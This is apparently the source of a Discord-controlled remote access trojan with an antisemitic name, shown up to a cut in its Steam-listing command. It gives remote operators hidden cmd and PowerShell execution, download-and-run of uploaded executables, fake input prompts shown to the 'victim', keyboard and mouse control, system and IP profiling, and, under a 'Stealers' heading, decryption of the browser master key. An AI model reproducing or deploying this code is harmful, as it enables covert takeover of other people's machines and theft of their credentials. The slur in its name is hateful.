from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from threading import Thread, Event
from Cryptodome.Cipher import AES
from discord.ext import commands
from PIL import Image, ImageDraw
from comtypes import CLSCTX_ALL
from pynput import keyboard
import win32com.client
import subprocess
import webbrowser
import win32crypt
import pyautogui
import PyElevate
import pyperclip
import pythoncom
import datetime
import platform
import pymsgbox
import requests
import asyncio
import discord
import getpass
import hashlib
import pyaudio
import sqlite3
import tarfile
import base64
import ctypes
import psutil
import shutil
import json
import time
import uuid
import wave
import cv2
import mss
import sys
import wmi
import io
import os
import re

TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
version = "1.0.3.9" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g

FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='$', intents=intents)
bot.remove_command('help')
pyautogui.FAILSAFE = False

async def fm_send(ctx, content: str, alt_content: str = None, filename: str = "output.txt"):
    if len(content) > 2000:
        if alt_content is not None:
            buffer = io.BytesIO(alt_content.encode("utf-8"))
        else:
            buffer = io.BytesIO(content.encode("utf-8"))
        await ctx.send(file=discord.File(fp=buffer, filename=filename))
    else:
        await ctx.send(content)

@bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)")
async def update(ctx):
    if not ctx.message.attachments:
        await ctx.send("No file attached. Please attach a `.exe` file.", empherial=True)
        return

    attachment = ctx.message.attachments[0]

    if not attachment.filename.lower().endswith(".exe"):
        await ctx.send("Attached file must be a `.exe`.", empherial=True)
        return

    try:
        save_path = os.path.join(os.path.dirname(sys.argv[0]), attachment.filename)
        await attachment.save(save_path)
        
        subprocess.Popen([save_path, "--hidewindow"], shell=True)
        await ctx.send(f"Updater `{attachment.filename}` has been downloaded and executed.")
    except Exception as e:
        await ctx.send(f"Could not process the update. {str(e)}", empherial=True)
        
async def prompt(ctx, *, question_and_default: str = ""):
    await ctx.send("✅ Prompt sent to victim. Waiting for input...")
    
    def show_prompt():
        parts = question_and_default.split("|", 1)
        question = parts[0].strip() if len(parts) >= 1 else ""
        default = parts[1].strip() if len(parts) == 2 else ""

        try:
            answer = pymsgbox.prompt(text=question, title="Input Required", default=default)
            if answer is None:
                response = "User canceled the prompt."
            else:
                response = f"User entered: `{answer}`"
        except Exception as e:
            response = f"Error showing prompt: {e}"

        asyncio.run_coroutine_threadsafe(ctx.reply(response), bot.loop)

    Thread(target=show_prompt, daemon=True).start()

@bot.command(help="Checks if the victims device is up.")
async def ping(ctx):
    await ctx.send("Pong!")

@bot.command(help="Shows victims device status including uptime, resource usage, etc.")
async def status(ctx):
    global version
    
    if True:
        # ── Names
        dev_name = platform.node()
        user_name = getpass.getuser()

        # ── Uptime (System & Bot)
        boot_time = psutil.boot_time()
        system_uptime = time.time() - boot_time
        program_uptime = time.time() - psutil.Process(os.getpid()).create_time()

        def format_duration(seconds):
            m, s = divmod(int(seconds), 60)
            h, m = divmod(m, 60)
            d, h = divmod(h, 24)
            return f"{d}d {h}h {m}m {s}s"

        # ── CPU & RAM Usage
        cpu_usage = psutil.cpu_percent(interval=1)
        proc = psutil.Process(os.getpid())
        rat_cpu = proc.cpu_percent(interval=1)
        rat_mem = proc.memory_info().rss / (1024**2)
        total_mem = psutil.virtual_memory().total / (1024**2)

        # ── Script Location
        script_path = os.path.abspath(sys.argv[0])

        # ── Embed
        embed = discord.Embed(
            title=f"`{dev_name}/{user_name}` Status",
            color=discord.Color.blue()
        )
        
        embed.add_field(name="Script Location", value=f"`{script_path}`", inline=False)
        embed.add_field(name="RAT Memory Usage", value=f"`{rat_mem:.2f}/{total_mem:.0f} MB`", inline=True)
        embed.add_field(name="RAT CPU Usage", value=f"`{rat_cpu}%`", inline=True)
        embed.add_field(name="System Uptime", value=f"`{format_duration(system_uptime)}`", inline=False)
        embed.add_field(name="Bot Uptime", value=f"`{format_duration(program_uptime)}`", inline=False)
        embed.add_field(name="System CPU Usage", value=f"`{cpu_usage}%`", inline=False)
        embed.add_field(name="Version", value=f"`{version}`", inline=False)
        await ctx.send(embed=embed)

def check_permissions(file_path):
    permissions = {
        'read': os.access(file_path, os.R_OK),
        'write': os.access(file_path, os.W_OK),
        'execute': os.access(file_path, os.X_OK),
        'delete': os.access(file_path, os.W_OK)
    }
    return permissions

@bot.command(help="Gets or sets the desktop wallpaper. Usage: $wallpaper get | $wallpaper set [optional: image path or upload image]")
async def wallpaper(ctx, action: str = None, filepath: str = None):
    try:
        if action is None or action.lower() not in ["get", "set"]:
            await ctx.send("Usage: `$wallpaper get` or `$wallpaper set [image path]` (or upload image)")
            return

        if action.lower() == "get":
            buf = ctypes.create_unicode_buffer(260)
            ctypes.windll.user32.SystemParametersInfoW(0x0073, len(buf), buf, 0)
            wallpaper_path = buf.value

            if os.path.exists(wallpaper_path):
                await ctx.send(
                    f"Current wallpaper is located at `{wallpaper_path}`",
                    file=discord.File(wallpaper_path, filename=os.path.basename(wallpaper_path))
                )
            else:
                await ctx.send(f"Wallpaper path: `{wallpaper_path}` (File not found)")
            return

        if action.lower() == "set":
            valid_exts = ('.png', '.jpg', '.jpeg', '.bmp')

            if filepath:
                if not os.path.exists(filepath):
                    await ctx.send(f"File not found: `{filepath}`")
                    return
                if not filepath.lower().endswith(valid_exts):
                    await ctx.send("Invalid file type from path. Must be .png, .jpg/jpeg, or .bmp.")
                    return
                ctypes.windll.user32.SystemParametersInfoW(20, 0, filepath, 3)
                await ctx.send(f"Wallpaper set from path: `{filepath}`")
                return

            if not ctx.message.attachments:
                await ctx.send("Please upload a `.png`, `.jpg/jpeg`, or `.bmp` image, or provide a valid path.")
                return

            attachment = ctx.message.attachments[0]
            if not any(attachment.filename.lower().endswith(ext) for ext in valid_exts):
                await ctx.send("Invalid file type. Only .png, .jpg/jpeg, or .bmp files are allowed.")
                return

            c = wmi.WMI()
            system_uuid = c.Win32_ComputerSystemProduct()[0].UUID
            ext = os.path.splitext(attachment.filename)[-1]
            temp_path = os.path.join(os.getenv("TEMP"), f"wallpaper_{system_uuid}{ext}")
            await attachment.save(temp_path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_path, 3)
            await ctx.send("Wallpaper set successfully from uploaded image.")
    except Exception as e:
        await ctx.send(f"Error processing wallpaper command: {str(e)}")

@bot.command(help="Controls system volume. Usage: $vol [up/down/set/mute/unmute/query] [value]")
async def vol(ctx, action: str = "query", value: int = None):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))

        if action == "up":
            step = value if value is not None else 2
            current = volume.GetMasterVolumeLevelScalar()
            volume.SetMasterVolumeLevelScalar(min(current + step / 100, 1.0), None)
            await ctx.send(f"Volume increased to {int(volume.GetMasterVolumeLevelScalar() * 100)}%")

        elif action == "down":
            step = value if value is not None else 2
            current = volume.GetMasterVolumeLevelScalar()
            volume.SetMasterVolumeLevelScalar(max(current - step / 100, 0.0), None)
            await ctx.send(f"Volume decreased to {int(volume.GetMasterVolumeLevelScalar() * 100)}%")

        elif action == "set":
            if value is None or not (0 <= value <= 100):
                await ctx.send("Please provide a valid volume percentage (0-100).")
                return
            volume.SetMasterVolumeLevelScalar(value / 100, None)
            await ctx.send(f"Volume set to {value}%")

        elif action == "mute":
            volume.SetMute(1, None)
            await ctx.send("System muted.")

        elif action == "unmute":
            volume.SetMute(0, None)
            await ctx.send("System unmuted.")

        elif action == "query":
            current_volume = int(volume.GetMasterVolumeLevelScalar() * 100)
            mute = volume.GetMute()
            status = "Muted" if mute else "Unmuted"
            await ctx.send(f"Volume: {current_volume}% ({status})")

        else:
            await ctx.send("Invalid action. Use up, down, set, mute, unmute, or query.")

    except Exception as e:
        await ctx.send(f"Error adjusting volume: {str(e)}")

# -------------------
#       PYMACRO
# -------------------

variables = {}

def f_wait_for_keys_internal(key_combo, ctxchannel):
    key_combo = key_combo.lower().split()
    keys_pressed = set()

    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char:
                keys_pressed.add(key.char.lower())
            elif hasattr(key, 'name') and key.name:
                keys_pressed.add(key.name.lower())
            
            if all(k in keys_pressed for k in key_combo):
                return False
        except Exception as e:
            asyncio.run(ctxchannel.send(f"Error in key listener: {e}"))

    def on_release(key):
        try:
            if hasattr(key, 'char') and key.char:
                keys_pressed.discard(key.char.lower())
            elif hasattr(key, 'name') and key.name:
                keys_pressed.discard(key.name.lower())
        except Exception as e:
            asyncio.run(ctxchannel.send(f"Error in key listener: {e}"))

    asyncio.run(ctxchannel.send(f"Waiting for keys: {' '.join(key_combo)}"))
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def f_evaluate_expression_internal(expression):
    try:
        resolved_expression = f_resolve_expression_internal(expression)
        return eval(resolved_expression, {"__builtins__": None}, {})
    except Exception as e:
        raise ValueError(f"Error evaluating expression: {expression}. Error: {str(e)}")

def f_parse_wrapped_string_internal(arg):
    if arg.startswith('"') and arg.endswith('"'):
        return re.sub(r'\\(["\'])', r'\1', arg[1:-1])
    elif arg.startswith("'") and arg.endswith("'"):
        return re.sub(r'\\(["\'])', r'\1', arg[1:-1])
    return arg

def f_resolve_expression_internal(expression):
    try:
        expression = re.sub(
            r"\!\$\{\%clip\%\}",
            lambda m: pyperclip.paste(),
            expression
        )

        expression = re.sub(
            r"\$\{([^}]+)\}",
            lambda m: str(variables.get(m.group(1), "")),
            expression
        )

        expression = re.sub(
            r"\$\{~([^}]+)~\}",
            lambda m: str(os.getenv(m.group(1), "")),
            expression
        )

        expression = re.sub(
            r"\$\{\+([^}]+)\+\}",
            lambda m: str(os.getenv(m.group(1), "")),
            expression
        )

        return expression
    except Exception as e:
        raise ValueError(f"Error resolving expression: {expression}. Error: {str(e)}")

def f_set_variable_internal(var, value):
    if var.startswith("~") and var.endswith("~"):
        os.environ[var[1:-1]] = value
    elif var.startswith("+") and var.endswith("+"):
        os.system(f"setx {var[1:-1]} {value}")
    else:
        variables[var] = value

async def f_parse_internal(command, ctx):
    try:
        parts = command.strip().split()
        if not parts:
            return

        cmd = parts[0].lower()

        def resolve_args(args):
            return [f_resolve_expression_internal(f_parse_wrapped_string_internal(arg)) for arg in args]

        if cmd == "cursor":
            x = int(f_evaluate_expression_internal(parts[1]))
            y = int(f_evaluate_expression_internal(parts[2]))
            pyautogui.moveTo(x, y)
        
        elif cmd == "key":
            key = f_resolve_expression_internal(parts[1].lower())
            action = parts[2].lower() if len(parts) > 2 else "press"
            if action == "down":
                pyautogui.keyDown(key)
            elif action == "up":
                pyautogui.keyUp(key)
            elif action == "press":
                pyautogui.press(key)

        elif cmd == "hotkey":
            combo = resolve_args(parts[1:])
            pyautogui.hotkey(*combo)

        elif cmd == "wait":
            if len(parts) > 2 and parts[-1].lower() in {"ms", "s", "sec", "seconds", "milliseconds"}:
                duration_expr = " ".join(parts[1:-1])
                unit = parts[-1].lower()
            else:
                duration_expr = " ".join(parts[1:])
                unit = "ms"

            duration = float(f_evaluate_expression_internal(duration_expr))

            if unit.startswith("ms"):
                await asyncio.sleep(duration / 1000)
            elif unit.startswith("s"):
                await asyncio.sleep(duration)

        elif cmd == "write":
            text = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[1:])))
            pyautogui.write(text)

        elif cmd == "mb":
            button_map = {1: "left", 2: "right", 3: "middle", 4: "x1", 5: "x2"}
            button = button_map.get(int(f_resolve_expression_internal(parts[1])), "left")
            action = parts[2].lower() if len(parts) > 2 else "press"
            if action == "down":
                pyautogui.mouseDown(button=button)
            elif action == "up":
                pyautogui.mouseUp(button=button)
            elif action == "press":
                pyautogui.click(button=button)

        elif cmd == "scroll":
            amount = int(f_evaluate_expression_internal(parts[1]))
            pyautogui.scroll(amount)

        elif cmd == "clip":
            subcmd = parts[1].lower()
            if subcmd == "copy":
                text = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[2:])))
                pyperclip.copy(text)
            elif subcmd == "paste":
                pyautogui.write(pyperclip.paste())
            elif subcmd == "clear":
                pyperclip.copy("")
            else:
                raise ValueError(f"Invalid clip action: {subcmd}")

        elif cmd == "set":
            var = parts[1]
            value = f_resolve_expression_internal(" ".join(parts[2:]))
            f_set_variable_internal(var, f_parse_wrapped_string_internal(value))

        elif cmd == "del":
            var = parts[1]
            if var.startswith("~") and var.endswith("~"):
                os.environ.pop(var[1:-1], None)
            elif var.startswith("+") and var.endswith("+"):
                os.system(f"setx {var[1:-1]} ''")
            else:
                variables.pop(var, None)

        elif cmd == "continue":
            keys = resolve_args(parts[1:])
            f_wait_for_keys_internal(" ".join(keys), ctx)

        elif cmd == "log":
            message = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[1:])))
            await ctx.send(message)

    except Exception as e:
        await ctx.send(f"Error processing command: {command}")
        await ctx.send(f"Exception: {e}")

def f_parse_config_options_internal(script):
    config = {
        "DisableAdminVarWarning": False,
        "FuncSplit": ";",
        "CommentOverride": None,
    }
    new_script_lines = []

    for line in script.splitlines():
        line = line.strip()
        if line.startswith("@"):
            if line.lower() == "@disableadminvarwarning":
                config["DisableAdminVarWarning"] = True
            elif line.lower().startswith("@funcsplit ="):
                split_char = line.split("=", 1)[1].strip().strip('"')
                config["FuncSplit"] = split_char
            elif line.lower().startswith("@commentoverride ="):
                comment_char = line.split("=", 1)[1].strip().strip('"')
                config["CommentOverride"] = None if comment_char.lower() == "none" else comment_char
        else:
            new_script_lines.append(line)

    return config, "\n".join(new_script_lines)

async def i_macro(execstr, ctx, echo_errors=True):
    try:
        if execstr is None:
            ctx.send("Input cannot be None")
            return

        config, cleaned_script = f_parse_config_options_internal(execstr)

        if not config["DisableAdminVarWarning"]:
            sys_var_pattern = r"set\s+\+([^\+]+)\+\s+"
            matches = re.findall(sys_var_pattern, execstr)
            if matches:
                ctx.send("WARNING: This script modifies system environment variables.")
                ctx.send("         These changes will only work if the program is run as administrator.")
                ctx.send(f"         Detected system variables: {', '.join(matches)}\n\n")

        commands = (
            cleaned_script.split(config["FuncSplit"])
            if config["FuncSplit"] != "\\n"
            else [line for line in cleaned_script.splitlines() if line.strip()]
        )

        for command in commands:
            if config["CommentOverride"] and config["CommentOverride"] in command:
                command = command.split(config["CommentOverride"], 1)[0].strip()

            if not command:
                continue

            await f_parse_internal(command.strip(), ctx)

    except Exception as e:
        if echo_errors:
            ctx.send(f"Error running macro:")
            ctx.send(f"Exception: {e}")

@bot.command(help="A modified version of PyMacro to work as a discord bot, docs at https://github.com/gabrielzv1233/PyMacro/blob/main/readme.md")
async def macro(ctx, *, command: str = None):
    if ctx.message.attachments:
        if len(ctx.message.attachments) > 1:
            await ctx.send("Please attach only one .pymacro file at a time.")
            return
        
        attachment = ctx.message.attachments[0]
        if attachment.filename.lower().endswith(".pymacro"):
            file_bytes = await attachment.read()
            script_content = file_bytes.decode("utf-8")
            await i_macro(script_content.strip(), ctx)
            return
        
    elif command != None:
        await i_macro(command.strip(), ctx)
        return
        
    await ctx.send("No .pymacro file attached!")

@bot.command(help="Runs a command using subprocess and streams output live")
async def cmd(ctx, *, command: str = None):
    if not command or not command.strip():
        await ctx.send("Command cannot be empty.")
        return

    try:
        process = subprocess.Popen(f'cmd /c "{command}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding="utf-8", errors="replace")

        thread = None
        first_output = None
        pending = []
        pending_len = 0
        MAX_MSG = 1900
        FLUSH_INTERVAL = 0.7

        import time as _t
        last_flush = _t.monotonic()

        async def ensure_thread():
            nonlocal thread, first_output
            if thread is None:
                current_datetime = datetime.datetime.now().strftime("-%S")
                base = (command or "")[:100 - len(current_datetime)]
                name = f"{base}{current_datetime}" or "cmd-output"
                if first_output and len(f"**Output:**\n{first_output}") <= 2000:
                    msg = await ctx.send(f"**Output:**\n{first_output}")
                else:
                    buf = io.BytesIO((f"**Output:**\n{first_output}" if first_output else "**Output:**").encode("utf-8"))
                    msg = await ctx.send(file=discord.File(fp=buf, filename="command_output.txt"))
                thread = await msg.create_thread(name=name)

        async def flush(force=False):
            nonlocal pending, pending_len, last_flush
            if not pending:
                return
            if not force and (_t.monotonic() - last_flush) < FLUSH_INTERVAL and pending_len < MAX_MSG:
                return
            await ensure_thread()
            chunk = "\n".join(pending)
            if len(chunk) > 2000:
                data = io.BytesIO(chunk.encode("utf-8"))
                await thread.send(file=discord.File(fp=data, filename="command_output.txt"))
            else:
                await thread.send(chunk)
            pending.clear()
            pending_len = 0
            last_flush = _t.monotonic()

        while True:
            line = process.stdout.readline()
            if line == "" and process.poll() is not None:
                break
            if not line:
                await asyncio.sleep(0.02)
                await flush()
                continue

            s = line.rstrip("\r\n")
            if not s:
                continue

            if first_output is None:
                first_output = s
                continue

            if len(s) > 2000:
                await ensure_thread()
                data = io.BytesIO(s.encode("utf-8"))
                await thread.send(file=discord.File(fp=data, filename="line_output.txt"))
                continue

            pending.append(s)
            pending_len += len(s) + 1
            if pending_len >= MAX_MSG:
                await flush(force=True)
            elif (_t.monotonic() - last_flush) >= FLUSH_INTERVAL:
                await flush()

        if first_output and thread is None:
            await ctx.send(f"**Output:**\n{first_output}")

        await flush(force=True)

    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command(help="Runs a command in PowerShell and streams output live")
async def ps(ctx, *, command: str = None):
    if not command or not command.strip():
        await ctx.send("Command cannot be empty.")
        return

    try:
        ps_exe = shutil.which("pwsh") or shutil.which("powershell") or "powershell"
        ps_boot = "[Console]::OutputEncoding = New-Object System.Text.UTF8Encoding($false); $OutputEncoding = [Console]::OutputEncoding;"
        ps_cmd = [
            ps_exe,
            "-NoLogo",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-WindowStyle", "Hidden",
            "-NonInteractive",
            "-Command", f"{ps_boot}; & {{ {command} }} 2>&1"
        ]

        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        creation = 0
        if hasattr(subprocess, "CREATE_NO_WINDOW"):
            creation |= subprocess.CREATE_NO_WINDOW

        process = subprocess.Popen(
            ps_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            text=True,
            encoding="utf-8",
            errors="replace",
            startupinfo=si,
            creationflags=creation
        )

        thread = None
        first_output = None
        pending = []
        pending_len = 0
        MAX_MSG = 1900
        FLUSH_INTERVAL = 0.7

        import time as _t
        last_flush = _t.monotonic()

        async def ensure_thread():
            nonlocal thread, first_output
            if thread is None:
                current_datetime = datetime.datetime.now().strftime("-%S")
                base = (command or "")[:100 - len(current_datetime)]
                name = f"{base}{current_datetime}" or "ps-output"
                if first_output and len(f"**Output:**\n{first_output}") <= 2000:
                    msg = await ctx.send(f"**Output:**\n{first_output}")
                else:
                    buf = io.BytesIO((f"**Output:**\n{first_output}" if first_output else "**Output:**").encode("utf-8"))
                    msg = await ctx.send(file=discord.File(fp=buf, filename="command_output.txt"))
                thread = await msg.create_thread(name=name)

        async def flush(force=False):
            nonlocal pending, pending_len, last_flush
            if not pending:
                return
            if not force and (_t.monotonic() - last_flush) < FLUSH_INTERVAL and pending_len < MAX_MSG:
                return
            await ensure_thread()
            chunk = "\n".join(pending)
            if len(chunk) > 2000:
                data = io.BytesIO(chunk.encode("utf-8"))
                await thread.send(file=discord.File(fp=data, filename="command_output.txt"))
            else:
                await thread.send(chunk)
            pending.clear()
            pending_len = 0
            last_flush = _t.monotonic()

        while True:
            line = process.stdout.readline()
            if line == "" and process.poll() is not None:
                break
            if not line:
                await asyncio.sleep(0.02)
                await flush()
                continue

            s = line.rstrip("\r\n")
            if not s:
                continue

            if first_output is None:
                first_output = s
                continue

            if len(s) > 2000:
                await ensure_thread()
                data = io.BytesIO(s.encode("utf-8"))
                await thread.send(file=discord.File(fp=data, filename="line_output.txt"))
                continue

            pending.append(s)
            pending_len += len(s) + 1
            if pending_len >= MAX_MSG:
                await flush(force=True)
            elif (_t.monotonic() - last_flush) >= FLUSH_INTERVAL:
                await flush()

        if first_output and thread is None:
            await ctx.send(f"**Output:**\n{first_output}")

        await flush(force=True)

    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command(name='checkperms', help="Checks if the program has access to provided file path")
async def checkperms(ctx, file_path: str):
    permissions = check_permissions(file_path)
    perms_message = '\n'.join([f'{perm}: {value}' for perm, value in permissions.items()])
    await ctx.send(f"Permissions for {file_path} are as follows:\n```{perms_message}```")

def compressed_device_id():
    uuid_raw = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
    return base64.b32encode(uuid.UUID(uuid_raw).bytes).decode().rstrip("=").lower()

@bot.command(help="Delete and recreate bot's channel, wiping all messages")
async def init(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("You don't have permission to initialize the configuration.")
        return

    category_name = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
    channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()

    category = discord.utils.get(ctx.guild.categories, name=category_name)

    if category is None:
        category_overwrites = {
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            ctx.guild.me: discord.PermissionOverwrite(read_messages=True) 
        }
        category = await ctx.guild.create_category(category_name, overwrites=category_overwrites)

    existing_channel = discord.utils.get(category.text_channels, name=channel_name)

    if ctx.message.content.endswith("/f"):
        if existing_channel:
            await existing_channel.delete()
        new_channel = await ctx.guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
        await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
    else:
        if existing_channel:
            await ctx.send("Channel already exists. Run `$init /f` to wipe the channel.")
        else:
            new_channel = await ctx.guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
            await new_channel.send(f"Bot channel created by {ctx.author.mention}.")

@bot.event
async def on_guild_join(guild):
    category_name = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
    channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()

    category = discord.utils.get(guild.categories, name=category_name)
    
    if category is None:
        category_overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        category = await guild.create_category(category_name, overwrites=category_overwrites)

    existing_channel = discord.utils.get(category.text_channels, name=channel_name)

    if existing_channel is None:
        new_channel = await guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
        await new_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")

@bot.event
async def on_ready():
    in_server_amount = 0
    logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S") + f" (UTC{'-' if (offset := (time.altzone if time.localtime().tm_isdst else time.timezone) // 3600) < 0 else '+'}{abs(offset)})"

    for guild in bot.guilds:
        category_name = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
        channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()

        category = discord.utils.get(guild.categories, name=category_name)
        
        if category is None:
            category_overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            category = await guild.create_category(category_name, overwrites=category_overwrites)

        existing_channel = discord.utils.get(category.text_channels, name=channel_name)
        
        if existing_channel is None:
            new_channel = await guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
            await new_channel.edit(topic=logon_date)
            await new_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
        else:
            await existing_channel.edit(topic=logon_date)
            await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
        in_server_amount += 1

    print(f'Bot logged in as "{bot.user.name}" on {in_server_amount} server(s)')
    
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    expected_category = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
    expected_channel = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()
    actual_category = message.channel.category.name if message.channel.category else None
    
    if actual_category != expected_category or message.channel.name != expected_channel:
        return  

    await bot.process_commands(message)
    
@bot.command(help="Gets information on the victim's system")
async def sysinfo(ctx):
    try:
        c = wmi.WMI()
        windows_devicename = platform.node()
        windows_device_uuid = c.Win32_ComputerSystemProduct()[0].UUID
        windows_version = platform.version()
        windows_os_build = platform.win32_ver()[1]
        windows_os_type = platform.win32_ver()[0]
        timezone = time.tzname[0] if time.daylight != 0 else time.tzname[1]
        
        system = c.Win32_ComputerSystem()[0]
        bios = c.Win32_BIOS()[0]
        processor = c.Win32_Processor()[0]
        network_adapters = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
        physical_disk = c.Win32_DiskDrive()[0]
        
        serial_number = getattr(bios, 'SerialNumber', "Unknown")
        manufacturer = getattr(system, 'Manufacturer', "Unknown")
        model = getattr(system, 'Model', "Unknown")
        total_ram = int(system.TotalPhysicalMemory) // (1024**2) if hasattr(system, 'TotalPhysicalMemory') else "Unknown"
        total_ram_gb = total_ram / 1024 if total_ram != "Unknown" else "Unknown"
        cpu = getattr(processor, 'Name', "Unknown")
        total_main_drive_storage = int(physical_disk.Size) // (1024**3) if hasattr(physical_disk, 'Size') else "Unknown"
        network_adapter = network_adapters[0].Description.split(" - ")[-1] if network_adapters else "Unknown"
        
        uuid_process = subprocess.run(['wmic', 'csproduct', 'get', 'uuid'], capture_output=True, text=True)
        device_uuid = uuid_process.stdout.strip().split('\n')[-1]
        if device_uuid.startswith("UUID"):
            device_uuid = device_uuid.replace("UUID", "").strip()
        
        sku_number = getattr(system, 'IdentifyingNumber', "Unknown")
        ip = requests.get('https://api.ipify.org').content.decode('utf8')
    
    except Exception as e:
        await ctx.send(f"Error fetching system information: {e}")
        return
    
    output = ""
    output += f"Windows Information:\n"
    output += f"Windows device UUID: {windows_device_uuid}\n"
    output += f"Windows devicename: {windows_devicename}\n"
    output += f"Windows Version: {windows_version}\n"
    output += f"Windows OS Build: {windows_os_build}\n"
    output += f"Windows OS Type: {windows_os_type}\n"
    output += f"\nOther Information:\n"
    output += f"Public IP: {ip}\n"
    output += f"Timezone: {timezone}\n"
    output += f"\nDevice Specifications:\n"
    output += f"Serial Number: {serial_number}\n"
    output += f"Manufacturer: {manufacturer}\n"
    output += f"Model: {model}\n"
    output += f"Total RAM: {total_ram_gb:.2f} GB ({total_ram} MB)\n"
    output += f"CPU: {cpu}\n"
    output += f"Total Main Drive Storage: {total_main_drive_storage} GB\n"
    output += f"Network adapter: {network_adapter}\n"
    output += f"Device UUID: {device_uuid}\n"
    output += f"SKU Number: {sku_number}\n"
    
    if len(output) > 2000:
        buffer = io.BytesIO(output.encode('utf-8'))
        await ctx.send(file=discord.File(fp=buffer, filename="system_info.txt"))
    else:
        await ctx.send(output)

# Stealers

def get_master_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

@bot.command(help="Lists valid Start Menu shortcuts on the victim's system.")
async def liststartapps(ctx):

    start_menu_paths = [
        os.path.join(os.getenv("ProgramData"), r"Microsoft\Windows\Start Menu\Programs"),
        os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs")
    ]

    shell = win32com.client.Dispatch("WScript.Shell")
    exclude_keywords = {"eula", "documentation", "faq"}
    apps = []
    appsunsf = []

    for base_path in start_menu_paths:
        for root, _, files in os.walk(base_path):
            for file in files:
                if not file.lower().endswith(".lnk"):
                    continue

                full_path = os.path.join(root, file)
                name = os.path.splitext(file)[0]

                if any(excluded in name.lower() for excluded in exclude_keywords):
                    continue

                try:
                    shortcut = shell.CreateShortcut(full_path)
                    target = shortcut.TargetPath
                    if not target or not os.path.exists(target):
                        continue
                except:
                    continue

                apps.append(f"> **{name}** `{full_path}`")
                appsunsf.append(f"{name} - {full_path}")
                
    output = "\n".join(sorted(apps)) or "No valid shortcuts found."
    outputunsf = "\n".join(sorted(appsunsf)) or "No valid shortcuts found."
    await fm_send(ctx, output, outputunsf, "startmenu.txt", )

@bot.command(help="Lists installed Steam games with paths.")
async def liststeamapps(ctx):
    import os, glob
    try:
        import winreg
    except Exception:
        winreg = None
    import vdf

    def get_steam_path():
        paths = []
        if winreg:
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam") as k:
                    p, _ = winreg.QueryValueEx(k, "SteamPath")
                    if p: paths.append(p)
            except Exception:
                pass
            for root in (winreg.HKEY_LOCAL_MACHINE,):
                for sub in (r"SOFTWARE\WOW6432Node\Valve\Steam", r"SOFTWARE\Valve\Steam"):
                    try:
                        with winreg.OpenKey(root, sub) as k:
                            p, _ = winreg.QueryValueEx(k, "InstallPath")
                            if p: paths.append(p)
                    except Exception:
                        pass
        paths += [
            os.path.expandvars(r"%PROGRAMFILES(X86)%\Steam"),
            os.path.expandvars(r"%PROGRAMFILES%\Steam"),
        ]
        for p in paths:
            p = os.path.normpath(p)
            if os.path.isdir(p):
                return p
        return None

    steam_path = get_steam_path()
    if not steam_path:
        await ctx.send("Could not locate Steam. Is it installed?")
        return

